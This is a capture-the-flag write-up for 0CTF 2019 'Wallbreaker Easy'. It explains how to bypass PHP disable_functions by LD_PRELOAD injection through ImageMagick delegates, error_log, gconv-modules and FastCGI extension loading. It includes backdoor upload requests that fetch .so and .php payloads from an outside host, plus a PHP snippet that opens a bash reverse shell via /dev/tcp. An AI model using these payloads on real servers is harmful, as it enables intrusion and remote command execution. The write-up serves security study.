### References

- [@rmb122, 0ctf Wallbreaker Easy 详细 Writeup, 2019-03-28](https://xz.aliyun.com/t/4589)
- [@mdsnins, WallbreakerEasy.md, 2019-05-27](https://github.com/mdsnins/ctf-writeups/blob/master/2019/0ctf%202019/Wallbreaker%20Easy/WallbreakerEasy.md)

**Tag: ImageMagick bypass disbale_functions**

1.disable_functions:

```tex
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail
```

Both `mail()` and `imap_open()` which are famous disable_functions bypass methods are disabled. But we have `putenv()`, which make LD_PRELOAD injection available is not disabled.

In addition, functions for file read/write (`file_put_contents`, `file_get_contents`) are not blocked, we can upload our any files.

2.The description said `php-imagick` is installed, and we also can check the Imagick in phpinfo. Imagick version is 3.4.3RC2 (with ghostscript 9.26) which already patched GhostScript vulnerability.

As we know the `php-imagick` is just a PHP extension of the `ImageMagick`. In the `ImageMagick` [Supported Image Formats](https://imagemagick.org/script/formats.php), it supports reading over 100 major file formats and some requires Ghostscript to read.

```tex
EPI EPS EPS2 EPS3 EPSF EPSI EPT PDF PS PS2 PS3
```

But in latest version of ImageMagick, for security reasons, the default configuration file disables some formatting calls to Ghostscript:

```bash
$ cat /etc/ImageMagick-6/policy.xml | grep -i -A 10 "ghostscript"
  <!-- disable ghostscript format types -->
  <policy domain="coder" rights="none" pattern="PS" />
  <policy domain="coder" rights="none" pattern="PS2" />
  <policy domain="coder" rights="none" pattern="PS3" />
  <policy domain="coder" rights="none" pattern="EPS" />
  <policy domain="coder" rights="none" pattern="PDF" />
  <policy domain="coder" rights="none" pattern="XPS" />
</policymap>
```

So may be we can use the `.ept` file, use `convert` to get a EPT file and test:

```bash
$ sudo apt install imagemagick
$ convert image.png ept:test.ept
$ file test.ept
test.ept: DOS EPS Binary File Postscript starts at byte 30 length 64676 TIFF starts at byte 64706 length 21274
```

The file command shows that it is still an `eps` file. Idk what’s the connection between them, testing found that this file does not seem to work...

```bash
$ strace -f php -r "new Imagick('test.ept');" 2>&1 | grep -E "execve|fork|vfork"
execve("/usr/bin/php", ["php", "-r", "new Imagick('test.ept');"], 0x7ffeb255bc98 /* 60 vars */) = 0
```

And if we comment the policy of eps, we can see it call `gs`:

```bash
$ strace -f php -r "new Imagick('test.ept');" 2>&1 | grep -E "execve|fork|vfork"
execve("/usr/bin/php", ["php", "-r", "new Imagick('test.ept');"], 0x7fff3e464498 /* 60 vars */) = 0
[pid 22578] execve("/usr/local/sbin/gs", [...], 0x55ff0ee7ceb0 /* 60 vars */) = -1 ENOENT (No such file or directory)
[pid 22578] execve("/usr/local/bin/gs", [...], 0x55ff0ee7ceb0 /* 60 vars */) = -1 ENOENT (No such file or directory)
[pid 22578] execve("/usr/sbin/gs", [...], 0x55ff0ee7ceb0 /* 60 vars */) = -1 ENOENT (No such file or directory)
[pid 22578] execve("/usr/bin/gs", [...], 0x55ff0ee7ceb0 /* 60 vars */) = 0
```

3.In official ImageMagick github, the [QuickStart.txt](https://github.com/ImageMagick/ImageMagick/blob/7.0.11-11/QuickStart.txt#L62) has following contents:

```tex
ImageMagick depends on a number of external configuration files which include colors.xml, delegates.xml, and others. ImageMagick searches for configuration files in the following order, and loads them if found: ...
```

we can find in the file `delegates.xml` defines the rules for ImageMagick handling of various file types:

```tex
<delegatemap>
    ......
  <delegate decode="png" encode="webp" command="&quot;cwebp&quot; -quiet %Q &quot;%i&quot; -o &quot;%o&quot;"/>
</delegatemap>
```

When encoding and decoding these formats, ImageMagick will call some external commands. But most of these are actually not installed by default.

So if we can find the command that comes with the system, we can use LD_PRELOAD injection and execute arbitrary commands:

```bash
$ cat /etc/ImageMagick-6/delegates.xml | grep -E "command=\"/bin|command=\"sh"

  <delegate decode="jxr" command="/bin/mv &quot;%i&quot; &quot;%i.jxr&quot;; &quot;JxrDecApp&quot; -i &quot;%i.jxr&quot; -o &quot;%o.pnm&quot;; /bin/mv &quot;%i.jxr&quot; &quot;%i&quot;; /bin/mv &quot;%o.pnm&quot; &quot;%o&quot;"/>
  <delegate decode="bmp" encode="jxr" command="/bin/mv &quot;%i&quot; &quot;%i.bmp&quot;; &quot;JxrEncApp&quot; -i &quot;%i.bmp&quot; -o &quot;%o.jxr&quot;; /bin/mv &quot;%i.bmp&quot; &quot;%i&quot;; /bin/mv &quot;%o.jxr&quot; &quot;%o&quot;"/>
  <delegate decode="bmp" encode="wdp" command="/bin/mv &quot;%i&quot; &quot;%i.bmp&quot;; &quot;JxrEncApp&quot; -i &quot;%i.bmp&quot; -o &quot;%o.jxr&quot;; /bin/mv &quot;%i.bmp&quot; &quot;%i&quot;; /bin/mv &quot;%o.jxr&quot; &quot;%o&quot;"/>
  <delegate decode="wdp" command="/bin/mv &quot;%i&quot; &quot;%i.jxr&quot;; &quot;JxrDecApp&quot; -i &quot;%i.jxr&quot; -o &quot;%o.bmp&quot;; /bin/mv &quot;%i.jxr&quot; &quot;%i&quot;; /bin/mv &quot;%o.bmp&quot; &quot;%o&quot;"/>
```

The system command `/bin/mv` is called when converting format `bmp` to `jxr` or `wdp`. So the delegate can be invoked by simply converting the format. Let's test again :)

```bash
$ cat test.php                                             
<?php
$a = new Imagick();
$a->readImage('image.png');
$a->writeImage('test.wdp');

$ strace -f php test.php 2&>1
^C

$ cat 1 | grep -E "execve|fork|vfork"
execve("/usr/bin/php", ["php", "test.php"], 0x7ffdefcc96a0 /* 60 vars */execve("/usr/bin/php", ["php", "test.php"], 0x7ffdefcc96a0 /* 60 vars */) = 0
...
[pid 31904] execve("/bin/mv", ["/bin/mv", "/tmp/magick-31900zQd4OLFMRuti.jx"..., "/tmp/magick-31900zQd4OLFMRuti"], 0x558dec09d7d8 /* 60 vars */ <unfinished ...>
[pid 31904] execve("/bin/mv", ["/bin/mv", "/tmp/magick-31900zQd4OLFMRuti.jx"..., "/tmp/magick-31900zQd4OLFMRuti"], 0x558dec09d7d8 /* 60 vars */) = 0
```

Even if the image conversion fails because `JxrEncApp` does not exist, we can execute arbitrary command as long as a new process is started because of `/bin/mv`

4.**open_basedir: /var/www/html:/tmp/46c01c941bd10a9c3038752f7354f2e8**

Upload the `evil.so`, `evil.php` and whatever image with the backdoor:

```php
backdoor=file_put_contents("/tmp/46c01c941bd10a9c3038752f7354f2e8/evil.so", file_get_contents("http://192.168.200.1:8000/evil.so"));

backdoor=file_put_contents("/tmp/46c01c941bd10a9c3038752f7354f2e8/image.png", file_get_contents("http://192.168.200.1:8000/image.png"));

backdoor=file_put_contents("/var/www/html/evil.php", file_get_contents("http://192.168.200.1:8000/evil.php"));
```

then visit `evil.php` to get the reverse shell

![](https://i.imgur.com/O7sA9gi.png)

### Other way to exploit

Compare with the following:

```bash
$ strace -f php -r "mail('','','','');" 2>&1 | grep -E "execve|fork|vfork"
execve("/usr/bin/php", ["php", "-r", "mail('','','','');"], 0x7ffe4a449a58 /* 60 vars */) = 0
[pid 32548] execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "], 0x5560e3ed6eb0 /* 60 vars */ <unfinished ...>
[pid 32548] <... execve resumed>)       = 0
[pid 32549] execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"], 0x561c6dbcef98 /* 60 vars */) = -1 ENOENT (No such file or directory)

$ strace -f php -r "error_log('',1);" 2>&1 | grep -E "execve|fork|vfork"
execve("/usr/bin/php", ["php", "-r", "error_log('',1);"], 0x7fffecdffdf8 /* 9 vars */) = 0
[pid    67] execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "], 0x55b70a326e70 /* 9 vars */ <unfinished ...>
[pid    67] <... execve resumed> )      = 0
[pid    68] execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"], 0x55a53d4b0bd0 /* 9 vars */) = -1 ENOENT (No such file or directory)
```

So the `error_log` also available. Just use it to replace `mail` function:

```php
<?php
    putenv("cmd=bash -c 'exec bash -i &>/dev/tcp/192.168.200.1/9001 <&1'");
    putenv("LD_PRELOAD=/tmp/46c01c941bd10a9c3038752f7354f2e8/evil.so");
    error_log('', 1);
```

### After story

Check this out: https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80

```php
backdoor=file_put_contents("/tmp/46c01c941bd10a9c3038752f7354f2e8/payload.so", file_get_contents("http://192.168.200.1:8000/payload.so"));

backdoor=file_put_contents("/tmp/46c01c941bd10a9c3038752f7354f2e8/gconv-modules", file_get_contents("http://192.168.200.1:8000/gconv-modules"));

backdoor=file_put_contents("/var/www/html/poc.php", file_get_contents("http://192.168.200.1:8000/poc.php"));
```

![](https://i.imgur.com/OL7u7go.png)

### Other way again

In the [original repo](https://github.com/mo-xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy) of the challenge, the author found an interesting parameter, `MAGICK_CODER_MODULE_PATH`, in the [document](https://www.imagemagick.org/script/resources.php#Environment%20Variables), it can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory.

![](https://i.imgur.com/yDK1Zzy.png)

### Final

In the 0CTF/TCTF 2019 Final#Wallbreaker (not very) Hard, The same environment is used but with `putenv` disabled :p

Refer: [writeup](https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/#wallbreaker-(not-very)-hard), using the `extension` to bypass `disable_functions` to RCE. Just need to write the `extension_dir` and `extension` in `PHP_ADMIN_VALUE`, then we can load arbitrary extension.

Using [FuckFastcgi](https://github.com/w181496/FuckFastcgi/) to create FastCGI payload to overwrite settings.

```php
backdoor=file_put_contents("/tmp/46c01c941bd10a9c3038752f7354f2e8/hello.so", file_get_contents("http://192.168.200.1:8000/hello.so"));

backdoor=file_put_contents("/tmp/46c01c941bd10a9c3038752f7354f2e8/rshell.php", file_get_contents("http://192.168.200.1:8000/rshell.php"));

backdoor=file_put_contents("/var/www/html/poc.php", file_get_contents("http://192.168.200.1:8000/poc.php"));
```

visit `poc.php` will request `index.php`(file pointed to by `SCRIPT_FILENAME`) and prepend the `rshell.php`, then we can get the reverse shell.
